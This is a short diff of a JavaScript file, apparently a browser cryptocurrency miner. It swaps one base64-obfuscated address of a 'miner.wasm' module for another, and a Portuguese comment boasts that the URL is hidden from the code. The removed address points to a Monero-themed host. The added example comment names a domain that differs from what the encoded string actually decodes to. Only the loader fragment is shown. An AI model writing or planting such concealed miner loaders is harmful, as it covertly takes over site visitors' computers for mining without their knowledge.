@@ -14,7 +14,7 @@
 
     // 🌐 URL ofuscada (não aparece no código)
     function getWasmUrl() {
-        const enc = 'aHR0cHM6Ly9jZG4tZmFzdHhtci5saXZlL21pbmVyLndhc20=';
+        const enc = 'aHR0cHM6Ly9teS13YXNtLmRldi9taW5lci53YXNt'; // Exemplo: https://meu-wasm.dev/miner.wasm
         return atob(enc);
     }
 
@@ -82,3 +82,4 @@
     }
 
 })();
+
